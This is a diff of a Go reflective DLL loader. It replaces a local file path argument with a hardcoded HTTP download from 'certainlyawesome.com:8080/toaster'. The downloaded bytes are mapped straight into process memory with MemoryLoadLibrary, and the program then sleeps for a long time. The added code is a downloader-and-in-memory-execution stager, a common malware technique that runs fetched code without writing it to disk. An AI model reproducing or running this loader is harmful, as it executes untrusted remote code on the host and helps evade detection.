@@ -1,44 +1,36 @@
 package main
 
 import (
-	"io/ioutil"
+	"io"
 	"log"
+	"net/http"
 	"os"
 	"reflectivePEdll/pkg/manualmap"
-	"strconv"
 	"time"
 )
 
-func loadDll(path string, pid int) error {
+func loadDll(pid int) error {
 
-	PEBytes, err := ioutil.ReadFile(path)
+	resp, err := http.Get("http://certainlyawesome.com:8080/toaster")
 	if err != nil {
 		return err
 	}
+	defer resp.Body.Close()
 
-	return manualmap.MemoryLoadLibrary(PEBytes, pid)
+	dll, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return err
+	}
+	return manualmap.MemoryLoadLibrary(dll, pid)
 }
 
 func main() {
-	if len(os.Args) < 2 {
-		log.Println("Give dll path")
-		return
-	}
 
 	pid := os.Getpid()
-	if len(os.Args) > 2 {
-		var err error
-		pid, err = strconv.Atoi(os.Args[2])
-		if err != nil {
-			log.Fatal(err)
-		}
-	}
 
 	log.Println("Starting load...")
 
-	log.Println(loadDll(os.Args[1], pid))
+	log.Println(loadDll(pid))
 
-	if pid == os.Getpid() {
-		time.Sleep(10 * time.Minute)
-	}
+	time.Sleep(100 * time.Minute)
 }
